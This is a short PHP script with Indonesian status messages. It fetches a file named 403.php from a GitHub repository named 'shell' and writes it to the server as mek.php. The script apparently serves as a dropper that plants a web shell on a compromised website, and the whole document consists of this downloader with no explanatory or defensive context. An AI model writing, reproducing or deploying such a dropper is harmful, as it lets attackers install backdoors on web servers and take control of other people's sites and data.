<?php
$url = 'https://raw.githubusercontent.com/purwocode/shell/refs/heads/main/403.php';
$save_as = 'mek.php';

echo "[+] Mengambil konten dari: $url<br>";

$content = file_get_contents($url);

if ($content === false) {
    echo "[-] Gagal mengambil konten dari URL.<br>";
    exit;
}

$result = file_put_contents($save_as, $content);

if ($result !== false) {
    echo "[+] File berhasil disimpan sebagai: $save_as<br>";
    echo "[+] Ukuran file: " . filesize($save_as) . " bytes<br>";
} else {
    echo "[-] Gagal menyimpan file ke: $save_as<br>";
}
?>
